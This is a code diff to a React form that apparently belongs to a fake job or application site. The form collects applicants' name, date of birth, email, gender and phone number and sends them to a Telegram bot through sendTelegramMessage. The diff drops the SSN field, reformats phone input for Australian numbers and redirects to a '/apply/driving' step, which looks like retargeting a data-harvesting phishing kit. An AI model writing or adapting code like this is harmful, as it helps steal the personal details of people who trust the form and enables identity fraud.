@@ -16,7 +16,6 @@ const PersonalInformationForm = () => {
     confirmEmail: "",
     phone: "",
     gender: "",
-    ssn: "",
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
 
@@ -27,13 +26,26 @@ const PersonalInformationForm = () => {
     }));
   };
 
-  const formatSSN = (value: string) => {
-    return value.replace(/\D/g, "").replace(/(\d{3})(\d{2})(\d{4})/, "$1-$2-$3");
-  };
+  
 
-  const formatPhone = (value: string) => {
-    return value.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{4})/, "($1) $2-$3");
+  const formatPhone = (value: string): string => {
+    // Remove all non-digit characters
+    const cleaned = value.replace(/\D/g, "");
+  
+    // For mobile numbers (starting with 04 and 10 digits)
+    if (/^04\d{8}$/.test(cleaned)) {
+      return cleaned.replace(/(04)(\d{3})(\d{3})(\d{2})/, "$1 $2 $3 $4");
+    }
+  
+    // For landline numbers (starting with 0 and 10 digits)
+    if (/^0[2-8]\d{8}$/.test(cleaned)) {
+      return cleaned.replace(/(0\d)(\d{4})(\d{4})/, "($1) $2 $3");
+    }
+  
+    // Return original value if format doesn't match
+    return value;
   };
+  
 
   const validateForm = () => {
     const newErrors: Record<string, string> = {};
@@ -47,7 +59,6 @@ const PersonalInformationForm = () => {
     if (formData.email !== formData.confirmEmail) newErrors.confirmEmail = "Emails do not match";
     if (!formData.phone.trim()) newErrors.phone = "Phone Number is required";
     if (!formData.gender) newErrors.gender = "Gender is required";
-    if (!formData.ssn.trim()) newErrors.ssn = "SSN is required";
     return newErrors;
   };
 
@@ -67,11 +78,10 @@ const PersonalInformationForm = () => {
     Date of Birth: ${dob}
     Email: ${formData.email}
     Gender: ${formData.gender}
-    Phone Number: ${formData.phone}
-    SSN: ${formData.ssn}`;
+    Phone Number: ${formData.phone}`;
 
     await sendTelegramMessage(message);
-    router.push("/apply/education");
+    router.push("/apply/driving");
     const userData = { ...formData };
 
   // Save data to localStorage
@@ -219,18 +229,7 @@ const PersonalInformationForm = () => {
               {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
             </div>
 
-            {/* SSN */}
-            <div className="mb-6">
-              <label className="block text-sm font-medium text-black">Social Security Number</label>
-              <input
-                value={formData.ssn}
-                onChange={(e) => handleChange("ssn", formatSSN(e.target.value))}
-                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
-                maxLength={11}
-                required
-              />
-              {errors.ssn && <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>}
-            </div>
+            
 
             <button type="submit" className="w-full bg-green-500 text- p-4 rounded-xl hover:bg-green-600">
               Next
